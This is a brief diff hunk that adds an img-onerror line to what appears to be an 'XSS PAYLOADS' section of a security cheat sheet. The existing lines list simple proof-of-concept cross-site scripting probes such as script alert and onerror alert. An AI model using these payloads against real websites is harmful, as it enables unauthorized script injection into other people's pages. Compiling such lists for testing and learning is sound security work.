@@ -132,6 +132,7 @@ try :
 
 ### XSS PAYLOADS
 ```html
+<img src=xxx onerror="console.log('XSS')">
 <script>alert(“Hello World”)</script>
 document.write
 <img src=x onerror=alert(2)>
